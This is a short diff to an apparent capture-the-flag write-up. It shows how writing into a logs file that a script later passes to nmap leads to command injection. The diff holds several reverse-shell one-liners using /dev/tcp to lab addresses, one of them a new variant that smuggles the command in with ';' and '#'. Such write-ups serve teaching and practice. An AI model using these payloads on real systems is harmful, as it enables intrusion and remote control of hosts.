@@ -55,6 +55,10 @@ in this script, read the content of logs.hackers, use the part after 2nd element
 Let us put a reverse shell in to hackers
 
 `echo 'x x $(bash -c "bash -i &>/dev/tcp/10.10.x.x/7777 0>&1")' > /home/kid/logs/hackers`
+or 
+`a b ;bash -c "bash -i &>/dev/tcp/10.10.16.37/8821 0>&1" #'
+comment commands after payload
+
 The script will run
 `nmap $(bash -c "bash -i &>/dev/tcp/10.10.x.x/7777 0>&1")`
 $() works as  command substitution, the output of $() will sent to nmap. but $() will be executed.
